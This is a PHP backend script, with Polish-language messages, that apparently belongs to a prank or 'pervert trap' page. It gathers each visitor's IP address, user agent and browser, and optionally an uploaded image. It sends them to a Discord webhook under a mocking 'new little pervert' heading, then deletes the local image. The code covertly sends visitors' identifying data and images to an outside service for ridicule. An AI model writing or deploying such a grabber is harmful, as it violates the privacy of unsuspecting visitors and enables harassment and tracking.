<?php

// CONST
define("USER_AGENT", $_SERVER['HTTP_USER_AGENT'] ?? '');
define("UPLOAD_DIR", dirname(__DIR__) . "//uploads/");
define('MAX_SIZE', 2 * 1024 * 1024); // 2 MB
define('DISCORD_WEBHOOK', '');
define("BOT_USERNAME", "Naganiacz69");

function sendDataToDiscord($imagePath = null) {
    $message = "### 🍆 NOWY ZBOCZUSZEK! 🍆" . "\n**🧔User Agent: ** " . "``" . USER_AGENT . "``" . "\n**🤖 Przeglądarka: **" . '``' . getBrowser(USER_AGENT) . "``" . "\n**🛜 IP: **" . "``" . getUserIP() . "``";

    if(isset($imagePath)) {
        // Prepare file upload
        $file = new CURLFile($imagePath, mime_content_type($imagePath), basename($imagePath));

        $data = array(
            'content' => $message,
            'username' => BOT_USERNAME,
            'file' => $file,
        );
    } else {
        // Create a payload
        $data = array(
            'content' => $message,
            'username' => BOT_USERNAME,
        );
    }

    // Initialize cURL
    $ch = curl_init(DISCORD_WEBHOOK);

    // Set cURL options
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: multipart/form-data'));
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    // Execute the POST request
    $response = curl_exec($ch);

    // Close the cURL session
    curl_close($ch);

    // Remove file from filesystem
    if(isset($imagePath)){
        removeImage($imagePath);
    }
}

function removeImage($file) {
    // Check if the file exists before attempting to delete it
    if (file_exists($file)) {
        unlink($file);
    } 
}

// Function to determine the browser
function getBrowser($userAgent) {
    if (strpos($userAgent, 'Firefox') !== false) {
        return 'Mozilla Firefox';
    } elseif (strpos($userAgent, 'Chrome') !== false) {
        return 'Google Chrome';
    } elseif (strpos($userAgent, 'Safari') !== false) {
        return 'Apple Safari';
    } elseif (strpos($userAgent, 'Opera') || strpos($userAgent, 'OPR') !== false) {
        return 'Opera';
    } elseif (strpos($userAgent, 'MSIE') !== false || strpos($userAgent, 'Trident') !== false) {
        return 'Internet Explorer';
    } else {
        return 'Unknown Browser';
    }
}

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        // Check IP from shared internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Check IP passed from proxies
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        // Default: Get the remote address
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    
    return $ip;
}

?>